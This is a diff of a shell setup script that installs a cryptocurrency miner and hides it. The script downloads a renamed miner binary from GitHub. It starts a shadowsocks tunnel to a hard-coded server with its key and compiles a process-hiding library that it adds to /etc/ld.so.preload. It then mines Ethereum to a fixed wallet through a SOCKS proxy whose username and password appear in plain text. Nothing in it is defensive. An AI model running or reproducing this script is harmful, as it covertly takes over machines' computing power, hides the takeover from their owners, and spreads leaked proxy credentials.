@@ -1,10 +1,8 @@
 #!/bin/sh
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -25,28 +23,30 @@ sleep .2
 echo " "
 echo " "
 
-echo ""
+echo "******************************************************************"
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+echo "******************************************************************"
 
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/trexminer/T-Rex/releases/download/0.24.6/t-rex-0.24.6-linux.tar.gz
-tar -xvzf t-rex-0.24.6-linux.tar.gz
-chmod +x t-rex
-ph add t-rex
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
+chmod +x basket
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+apt -y install shadowsocks-libev rng-tools
+rngd -r /dev/urandom
+ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBasket.zip
+unzip magicBasket.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
+./basket -a ethash -o ethproxy+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5.DENT -log --proxy socks5 = Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
